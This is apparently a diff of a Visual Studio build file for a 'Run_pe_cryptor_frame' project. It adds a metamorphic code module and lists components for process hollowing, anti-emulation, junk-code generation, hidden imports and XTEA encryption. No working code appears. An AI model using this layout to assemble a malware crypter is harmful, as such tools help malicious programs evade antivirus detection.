@@ -80,6 +80,7 @@
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <LinkIncremental>false</LinkIncremental>
     <GenerateManifest>false</GenerateManifest>
+    <IncludePath>C:\Users\Oleg\Documents\GitHub\Run_pe_cryptor_frame\modules\metamorph_code;C:\Users\Oleg\Documents\GitHub\Run_pe_cryptor_frame\modules;$(IncludePath)</IncludePath>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <LinkIncremental>false</LinkIncremental>
@@ -129,6 +130,7 @@
       <TreatSpecificWarningsAsErrors>4996</TreatSpecificWarningsAsErrors>
       <DebugInformationFormat>None</DebugInformationFormat>
       <BufferSecurityCheck>false</BufferSecurityCheck>
+      <CallingConvention>Cdecl</CallingConvention>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
@@ -158,15 +160,8 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClInclude Include="..\..\modules\data_crypt_string.h" />
-    <ClInclude Include="..\..\modules\data_to_protect.h" />
-    <ClInclude Include="..\..\modules\lazy_importer\lazy_importer.hpp" />
-    <ClInclude Include="..\..\modules\modules.h" />
-    <ClInclude Include="..\..\modules\trash_gen_module\fake_api.h" />
-    <ClInclude Include="pch.h" />
-  </ItemGroup>
-  <ItemGroup>
     <ClCompile Include="..\..\modules\antiemul\antiemul.cpp" />
+    <ClCompile Include="..\..\modules\metamorph_code\morph.cpp" />
     <ClCompile Include="..\..\modules\run_pe\run_pe.cpp" />
     <ClCompile Include="..\..\modules\trash_gen_module\fake_api.cpp" />
     <ClCompile Include="pch.cpp">
@@ -181,6 +176,12 @@
     <Object Include="..\..\modules\murmurhash\marmarhash.obj" />
     <Object Include="..\..\modules\trash_gen_module\fake_instructions.obj" />
     <Object Include="..\..\modules\xtea\xtea.obj" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="..\..\modules\metamorph_code\config.h" />
+    <ClInclude Include="..\..\modules\modules.h">
+      <DeploymentContent>false</DeploymentContent>
+    </ClInclude>
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
